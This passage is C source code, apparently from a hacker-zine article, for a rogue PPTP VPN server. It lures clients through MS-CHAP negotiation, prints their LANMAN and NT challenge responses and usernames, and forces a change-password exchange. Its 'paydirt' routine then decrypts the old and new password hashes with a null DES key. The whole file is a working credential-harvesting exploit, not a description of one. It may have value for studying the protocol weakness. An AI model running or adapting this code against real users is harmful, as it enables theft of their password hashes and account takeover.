+  u_int16_t flags;
+};
+
+#define ppp_chap_responce	ppp_chap_challenge
+
+void net_init();
+void getjiggywithit();
+void handleit(struct sockaddr_in *);
+void send_start_ctrl_conn_rply();
+void send_out_call_rply(struct pptp_out_call_rqst *, struct sockaddr_in *);
+int decaps_gre (int (*cb)(void *pack, unsigned len));
+int encaps_gre (void *pack, unsigned len);
+int do_ppp(void *pack, unsigned len);
+void do_gre(struct sockaddr_in *);
+void send_lcp_conf_rply(void *);
+void send_lcp_conf_rqst();
+void send_chap_challenge();
+void send_chap_failure();
+void print_challenge_responce(void *);
+void paydirt(void *);
+
+
+char *n;
+int sd, rsd, pid;
+
+void main(int argc, char **argv)
+{
+  n = argv[0];
+  net_init();
+  getjiggywithit();
+}
+
+void net_init()
+{
+  int yes = 1;
+  struct sockaddr_in sa;
+
+  if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { perror(n); exit(1); }
+  if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) != 0)
+  {
+    perror(n);
+    exit(1);
+  }
+
+  bzero((char *) &sa, sizeof(sa));
+  sa.sin_family      = AF_INET;
+  sa.sin_port        = htons(PPTP_PORT);
+  sa.sin_addr.s_addr = htonl(INADDR_ANY);
+
+  if (bind(sd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror(n); exit(1); }
+
+  if (listen(sd, 5) < 0) { perror(n); exit(1); }
+}
+
+void getjiggywithit()
+{
+  struct sockaddr_in sa;
+  int sucker, size;
+  size = sizeof(sa);
+
+
+
+  if ((sucker = accept(sd, (struct sockaddr *)&sa, &size)) == -1)
+  {
+    perror(n);
+    exit(1);
+  }
+  close(sd);
+  sd = sucker;
+  handleit(&sa);
+  exit(0);
+}
+
+void handleit(struct sockaddr_in *sa)
+{
+  union {
+    struct pptp_header h;
+    unsigned char buffer[8196];
+  } p;
+  int hlen, len, type;
+
+  hlen = sizeof(struct pptp_header);
+
+  for(;;)
+  {
+    len = read(sd, p.buffer, hlen);
+    if (len == -1) { perror(n); exit(1); }
+    if (len != hlen) { printf("Short read.\n"); exit(1); }
+
+    len = read(sd, p.buffer + hlen, ntoh16(p.h.length) - hlen);
+    if (len == -1) { perror(n); exit(1); }
+    if (len != (ntoh16(p.h.length) - hlen)) {printf("Short read.\n"); exit(1);}
+
+    if (ntoh32(p.h.magic) != 0x1A2B3C4D) { printf("Bad magic.\n"); exit(1); }
+    if (ntoh16(p.h.pptp_type) != 1) {printf("Not a control message.\n");exit(1);}
+
+    type = ntoh16(p.h.ctrl_type);
+    switch(type)
+    {
+      /* we got a live one */
+      case PPTP_START_CTRL_CONN_RQST: 
+        send_start_ctrl_conn_rply();
+        break;
+      case PPTP_OUT_CALL_RQST:
+        send_out_call_rply((struct pptp_out_call_rqst *)&p, sa);
+        break;
+      case PPTP_SET_LINK_INFO:
+        printf("<- PPTP Set Link Info\n");
+        break;
+      default:
+        printf("<- PPTP unknown packet: %d\n", type);
+    }
+  }
+}
+
+void send_start_ctrl_conn_rply()
+{
+  struct pptp_start_ctrl_conn p;
+  int len, hlen;
+
+  hlen  = sizeof(struct pptp_start_ctrl_conn);
+
+  printf("<- PPTP Start Control Connection Request\n");
+  printf("-> PPTP Start Control Connection Reply\n");
+
+  bzero((char *)&p, hlen);
+  p.header.length    = hton16(hlen);
+  p.header.pptp_type = hton16(PPTP_MESSAGE_CONTROL);
+  p.header.magic     = hton32(PPTP_MAGIC);
+  p.header.ctrl_type = hton16(PPTP_START_CTRL_CONN_RPLY);
+  p.version          = hton16(PPTP_VERSION);
+  p.result_code      = 1;
+  p.framing_cap      = hton32(PPTP_FRAME_ASYNC);   /* whatever */
+  p.bearer_cap       = hton32(PPTP_BEARER_ANALOG); /* ditto    */
+  bcopy("owned", p.hostname, 5); 
+  bcopy("r00t", p.vendor, 4);
+
+  len = write(sd, &p, hlen);
+  if (len == -1) { perror(n); exit(1); }
+  if (len != hlen) { printf("Short write.\n"); exit(1); }
+}
+
+static gre = 0;
+
+void send_out_call_rply(struct pptp_out_call_rqst *r, struct sockaddr_in *sa)
+{
+  struct pptp_out_call_rply p;
+  int len, hlen;
+
+  hlen = sizeof(struct pptp_out_call_rply);
+
+  printf("<- PPTP Outgoing Call Request\n");
+  printf("-> PPTP Outgoing Call Reply\n");
+
+  pptp_gre_call_id = r->call_id;
+
+  /* Start a process to handle the GRE/PPP packets */
+  if (!gre) 
+  {
+    gre = 1;
+    switch((pid = fork()))
+    {
+      case -1:
+        perror(n);
+        exit(1);
+
+      case 0:
+        close(sd);
+        do_gre(sa);
+        exit(1);        /* not reached */
+    }
+  }
+
+  bzero((char *)&p, hlen);
+  p.header.length    = hton16(hlen);
+  p.header.pptp_type = hton16(PPTP_MESSAGE_CONTROL);
+  p.header.magic     = hton32(PPTP_MAGIC);
+  p.header.ctrl_type = hton16(PPTP_OUT_CALL_RPLY);
+  p.call_id          = hton16(31337);
+  p.call_id_peer     = r->call_id;
+  p.result_code      = 1;
+  p.speed            = hton32(28800);
+  p.recv_size        = hton16(5);   /* whatever */
+  p.delay            = hton16(50);  /* whatever */
+  p.channel          = hton32(31337);
+
+  len = write(sd, &p, hlen);
+  if (len == -1) { perror(n); exit(1); }
+  if (len != hlen) { printf("Short write.\n"); exit(1); }
+
+}
+
+struct sockaddr_in src_addr;
+
+void do_gre(struct sockaddr_in *sa)
+{
+#ifndef BROKEN_RAW_CONNECT
+  struct sockaddr_in src_addr;
+#endif
+  int s, n, stat;
+
+  /* Open IP protocol socket */
+  rsd = socket(AF_INET, SOCK_RAW, PPTP_PROTO);
+  if (rsd<0) { perror("gre"); exit(1); }
+  src_addr.sin_family = AF_INET;
+  src_addr.sin_addr   = sa->sin_addr;
+  src_addr.sin_port   = 0;
+
+#ifndef BROKEN_RAW_CONNECT
+  if (connect(rsd, (struct sockaddr *) &src_addr, sizeof(src_addr))<0) {
+    perror("gre"); exit(1);
+  }
+#endif
+
+  ack_sent = ack_recv = seq_sent = seq_recv = 0;
+  stat=0;
+
+  /* Dispatch loop */
+  while (stat>=0) { /* until error happens on s */
+    struct timeval tv = {0, 0}; /* non-blocking select */
+    fd_set rfds;
+    int retval;
+
+    n = rsd + 1;
+    FD_ZERO(&rfds);
+    FD_SET(rsd, &rfds);
+
+    /* if there is a pending ACK, do non-blocking select */
+    if (ack_sent!=seq_recv)
+      retval = select(n, &rfds, NULL, NULL, &tv);
+    else /* otherwise, block until data is available */
+      retval = select(n, &rfds, NULL, NULL, NULL);
+    if (retval==0 && ack_sent!=seq_recv) /* if outstanding ack */
+      encaps_gre(NULL, 0); /* send ack with no payload */
+    if (FD_ISSET(rsd,  &rfds)) /* data waiting on socket */
+      stat=decaps_gre(do_ppp);
+  }
+
+  /* Close up when done. */
+  close(rsd); 
+}
+
+int decaps_gre (int (*cb)(void *pack, unsigned len)) {
+  unsigned char buffer[PACKET_MAX+64/*ip header*/];
+  struct pptp_gre_header *header;
+  int status, ip_len=0;
+
+  if((status=read(rsd, buffer, sizeof(buffer)))<0) 
+    {perror("gre"); exit(1); }
+  /* strip off IP header, if present */
+  if ((buffer[0]&0xF0)==0x40) 
+    ip_len = (buffer[0]&0xF)*4;
+  header = (struct pptp_gre_header *)(buffer+ip_len);
+
+  /* verify packet (else discard) */
+  if (((ntoh8(header->ver)&0x7F)!=PPTP_GRE_VER) || /* version should be 1   */
+      (ntoh16(header->protocol)!=PPTP_GRE_PROTO)|| /* GRE protocol for PPTP */
+      PPTP_GRE_IS_C(ntoh8(header->flags)) ||    /* flag C should be clear   */
+      PPTP_GRE_IS_R(ntoh8(header->flags)) ||    /* flag R should be clear   */
+      (!PPTP_GRE_IS_K(ntoh8(header->flags))) || /* flag K should be set     */
+      ((ntoh8(header->flags)&0xF)!=0)) { /* routing and recursion ctrl = 0  */
+    /* if invalid, discard this packet */
+    printf("Discarding GRE: %X %X %X %X %X %X", 
+         ntoh8(header->ver)&0x7F, ntoh16(header->protocol), 
+         PPTP_GRE_IS_C(ntoh8(header->flags)),
+         PPTP_GRE_IS_R(ntoh8(header->flags)), 
+         PPTP_GRE_IS_K(ntoh8(header->flags)),
+         ntoh8(header->flags)&0xF);
+    return 0;
+  }
+  if (PPTP_GRE_IS_A(ntoh8(header->ver))) { /* acknowledgement present */
+    u_int32_t ack = (PPTP_GRE_IS_S(ntoh8(header->flags)))?
+      header->ack:header->seq; /* ack in different place if S=0 */
+    if (ack > ack_recv) ack_recv = ack;
+    /* also handle sequence number wrap-around (we're cool!) */
+    if (((ack>>31)==0)&&((ack_recv>>31)==1)) ack_recv=ack;
+  }
+  if (PPTP_GRE_IS_S(ntoh8(header->flags))) { /* payload present */
+    unsigned headersize = sizeof(*header);
+    unsigned payload_len= ntoh16(header->payload_len);
+    u_int32_t seq       = ntoh32(header->seq);
+    if (!PPTP_GRE_IS_A(ntoh8(header->ver))) headersize-=sizeof(header->ack);
+    /* check for incomplete packet (length smaller than expected) */
+    if (status-headersize<payload_len) {
+      printf("incomplete packet\n");
+      return 0; 
+    }
+    /* check for out-of-order sequence number */
+    /* (handle sequence number wrap-around, cuz we're cool) */
+    if ((seq > seq_recv) || 
+        (((seq>>31)==0) && (seq_recv>>31)==1)) {
+      seq_recv = seq;
+
+      return cb(buffer+ip_len+headersize, payload_len);
+    } else {
+      printf("discarding out-of-order\n"); 
+      return 0; /* discard out-of-order packets */
+    }
+  }
+  return 0; /* ack, but no payload */
+}
+
+int encaps_gre (void *pack, unsigned len) {
+  union {
+    struct pptp_gre_header header;
+    unsigned char buffer[PACKET_MAX+sizeof(struct pptp_gre_header)];
+  } u;
+  static u_int32_t seq=0;
+  unsigned header_len;
+  int out;
+
+  /* package this up in a GRE shell. */
+  u.header.flags        = hton8 (PPTP_GRE_FLAG_K);
+  u.header.ver          = hton8 (PPTP_GRE_VER);
+  u.header.protocol     = hton16(PPTP_GRE_PROTO);
+  u.header.payload_len  = hton16(len);
+  u.header.call_id      = hton16(pptp_gre_call_id);
+  
+  /* special case ACK with no payload */
+  if (pack==NULL) 
+    if (ack_sent != seq_recv) {
+      u.header.ver |= hton8(PPTP_GRE_FLAG_A);
+      u.header.payload_len = hton16(0);
+      u.header.seq = hton32(seq_recv); /* ack is in odd place because S=0 */
+      ack_sent = seq_recv;
+#ifndef BROKEN_RAW_CONNCET
+      return write(rsd, &u.header, sizeof(u.header)-sizeof(u.header.seq));
+#else
+      return sendto(rsd, &u.header, sizeof(u.header)-sizeof(u.header.seq), 0,
+            (struct sockaddr *) &src_addr, sizeof(src_addr));
+#endif
+    } else return 0; /* we don't need to send ACK */
+  /* send packet with payload */
+  u.header.flags |= hton8(PPTP_GRE_FLAG_S);
+  u.header.seq    = hton32(seq);
+  if (ack_sent != seq_recv) { /* send ack with this message */
+    u.header.ver |= hton8(PPTP_GRE_FLAG_A);
+    u.header.ack  = hton32(seq_recv);
+    ack_sent = seq_recv;
+    header_len = sizeof(u.header);
+  } else { /* don't send ack */
+    header_len = sizeof(u.header) - sizeof(u.header.ack);
+  }
+  if (header_len+len>=sizeof(u.buffer)) return 0; /* drop this, it's too big */
+  /* copy payload into buffer */
+  memcpy(u.buffer+header_len, pack, len);
+  /* record and increment sequence numbers */
+  seq_sent = seq; seq++;
+  /* write this baby out to the net */
+#ifndef BROKEN_RAW_CONNECT
+  return write(rsd, u.buffer, header_len+len);
+#else
+  return sendto(rsd, &u.buffer, header_len+len, 0,
+        (struct sockaddr *) &src_addr, sizeof(src_addr));
+#endif
+}
+
+
+int do_ppp(void *pack, unsigned len)
+{
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header header;
+  } *p;
+
+  p = pack;
+
+  switch(ntoh16(p->ppp.proto))
+  {
+    case PPP_PROTO_LCP:
+      switch(ntoh8(p->header.code))
+      {
+        case  PPP_LCP_CODE_CONF_RQST:
+          printf("<- LCP Configure Request\n");
+          send_lcp_conf_rply(pack);
+          send_lcp_conf_rqst();
+          break;
+        case  PPP_LCP_CODE_CONF_ACK:
+          printf("<- LCP Configure Ack\n");
+          send_chap_challenge(pack);
+
+          break;
+        case PPP_LCP_CODE_IDENT:
+          /* ignore */
+          break;
+        default:
+          printf("<- LCP unknown packet: C=%X I=%X L=%X\n", p->header.code, 
+            p->header.ident, ntoh16(p->header.length));
+      }
+      break;
+    case PPP_PROTO_CHAP:
+      switch(ntoh8(p->header.code))
+      {
+        case PPP_CHAP_CODE_RESPONCE:
+          printf("<- CHAP Responce\n");
+          print_challenge_responce(pack);
+          send_chap_failure();
+          break;
+        case PPP_CHAP_CODE_MSCHAP_PASSWORD_V1:
+          paydirt(pack);
+          break;
+        default:
+          printf("<- CHAP unknown packet: C=%X I=%X L=%X\n", p->header.code, 
+            p->header.ident, ntoh16(p->header.length));
+      }
+      break;
+    default:
+      printf("<- PPP unknwon  packet: %X\n", ntoh16(p->ppp.proto)); 
+  }
+
+  return(1);
+}
+
+void send_lcp_conf_rply(void *pack)
+{
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header lcp;
+  } *p = pack;
+
+  printf("-> LCP Configure Ack\n");
+
+  p->lcp.code = hton8(PPP_LCP_CODE_CONF_ACK);
+  encaps_gre(p, ntoh16(p->lcp.length) + sizeof(struct ppp_header));
+}
+
+void send_lcp_conf_rqst()
+{
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header lcp;
+    struct ppp_lcp_chap_auth_option auth;
+  } pkt;
+
+  printf("-> LCP Configure Request\n");
+
+  bzero(&pkt, sizeof(pkt));
+  pkt.ppp.address     = hton8(PPP_ADDRESS);
+  pkt.ppp.control     = hton8(PPP_CONTROL);
+  pkt.ppp.proto       = hton16(PPP_PROTO_LCP);
+  pkt.lcp.code        = hton8(PPP_LCP_CODE_CONF_RQST);
+  pkt.lcp.ident       = hton8(9);
+  pkt.lcp.length      = hton16(4 +5);
+  pkt.auth.type       = hton8(PPP_LCP_CONFIG_OPT_AUTH);
+  pkt.auth.length     = hton8(5);
+  pkt.auth.auth_proto = hton16(PPP_PROTO_CHAP);
+  pkt.auth.algorithm  = hton8(PPP_LCP_AUTH_CHAP_ALGO_MSCHAP);
+ 
+  encaps_gre(&pkt, 13);
+}
+
+void send_chap_challenge()
+{
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header chap;
+    struct ppp_chap_challenge challenge;
+  } pkt;
+
+  printf("-> CHAP Challenge\n");
+
+  bzero(&pkt, sizeof(pkt));
+  pkt.ppp.address    = hton8(PPP_ADDRESS);
+  pkt.ppp.control    = hton8(PPP_CONTROL);
+  pkt.ppp.proto      = hton16(PPP_PROTO_CHAP);
+  pkt.chap.code      = hton8(PPP_CHAP_CODE_CHALLENGE);
+  pkt.chap.length    = hton16(13);
+  pkt.challenge.size = hton8(8);
+
+  encaps_gre(&pkt,  4 + 13);
+}
+
+void print_challenge_responce(void *pack)
+{
+  unsigned char name[512], *c;
+  int len;
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header chap;
+    struct ppp_chap_challenge responce;
+  } *p;
+
+  p = pack;
+
+  c = p->responce.value.responce.lanman;
+  printf("   LANMAN Responce: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
+  c[ 0], c[ 1], c[ 2], c[ 3], c[ 4], c[ 5], c[ 6], c[ 7], c[ 8], c[ 9], c[10],
+  c[11], c[12], c[13], c[14], c[15], c[16], c[17], c[18], c[19], c[20], c[21],
+  c[22], c[23]);
+  c = p->responce.value.responce.nt;
+  printf("   NTHash Responce: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
+  c[ 0], c[ 1], c[ 2], c[ 3], c[ 4], c[ 5], c[ 6], c[ 7], c[ 8], c[ 9], c[10],
+  c[11], c[12], c[13], c[14], c[15], c[16], c[17], c[18], c[19], c[20], c[21],
+  c[22], c[23]);
+  printf("   Use NT hash: %d\n", p->responce.value.responce.flag);
+
+
+  bzero(name, 512);
+  len = ntoh16(p->chap.length) - 54;
+  bcopy(((char *)p) + 4 + 54, name, len);
+  name[len] = '\0';
+  printf("   User: %s\n", name);
+}
+
+void send_chap_failure()
+{
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header chap;
+    char message[64];
+  } pkt;
+
+  printf("-> CHAP Failure\n");
+
+  bzero(&pkt, sizeof(pkt));
+  pkt.ppp.address = hton8(PPP_ADDRESS);
+  pkt.ppp.control = hton8(PPP_CONTROL);
+  pkt.ppp.proto   = hton16(PPP_PROTO_CHAP);
+  pkt.chap.code   = hton8(PPP_CHAP_CODE_FAILURE);
+  pkt.chap.length = hton16(4 + strlen(MSCHAP_ERROR));
+  strncpy(pkt.message, MSCHAP_ERROR, strlen(MSCHAP_ERROR));
+
+  encaps_gre(&pkt,  4 + 4 + strlen(MSCHAP_ERROR));
+}
+
+extern int des_check_key;
+
+void paydirt(void *pack)
+{
+  unsigned char out[8], out2[8], key[8];
+  struct {
+    struct ppp_header ppp;
+    struct ppp_lcp_chap_header chap;
+    struct ppp_mschap_change_password passwds;
+  } *pkt;
+  des_key_schedule ks;
+
+  pkt =  pack;
+  bzero(key, 8);
+
+  printf("<- MSCHAP Change Password Version 1 Packet.\n");
+
+  /* Turn off checking for weak keys within libdes */
+  des_check_key=0;
+  des_set_odd_parity((des_cblock *)key);
+  des_set_key((des_cblock *)key, ks);
+
+  des_ecb_encrypt((des_cblock *)pkt->passwds.old_lanman,(des_cblock *) out, ks, 0);
+  des_ecb_encrypt((des_cblock *)(pkt->passwds.old_lanman + 8), (des_cblock *)out2, ks, 0);
+  printf("   Old LANMAN: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
+  out [0], out [1], out [2], out [3], out [4], out [5], out [6], out [7],
+  out2[0], out2[1], out2[2], out2[3], out2[4], out2[5], out2[6], out2[7]);
+
+  des_ecb_encrypt((des_cblock *)pkt->passwds.new_lanman,(des_cblock *) out, ks, 0);
+  des_ecb_encrypt((des_cblock *)(pkt->passwds.new_lanman + 8), (des_cblock *)out2, ks, 0);
+  printf("   New LANMAN: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
+  out [0], out [1], out [2], out [3], out [4], out [5], out [6], out [7],
+  out2[0], out2[1], out2[2], out2[3], out2[4], out2[5], out2[6], out2[7]);
+
+  des_ecb_encrypt((des_cblock *)pkt->passwds.old_nt,(des_cblock *) out, ks, 0);
+  des_ecb_encrypt((des_cblock *)(pkt->passwds.old_nt + 8), (des_cblock *)out2, ks, 0);
+  printf("   Old NTHash: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
+  out [0], out [1], out [2], out [3], out [4], out [5], out [6], out [7],
+  out2[0], out2[1], out2[2], out2[3], out2[4], out2[5], out2[6], out2[7]);
+
+  des_ecb_encrypt((des_cblock *)pkt->passwds.new_nt,(des_cblock *) out, ks, 0);
+  des_ecb_encrypt((des_cblock *)(pkt->passwds.new_nt + 8), (des_cblock *)out2, ks, 0);
+  printf("   New NTHash: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
+  out [0], out [1], out [2], out [3], out [4], out [5], out [6], out [7],
+  out2[0], out2[1], out2[2], out2[3], out2[4], out2[5], out2[6], out2[7]);
+
+  printf("   New Password Length: %d\n", ntoh16(pkt->passwds.pass_length));
+
+  kill(pid, SIGTERM);
+  exit(0);
+}
+<-->
+
+
+----[  EOF
+
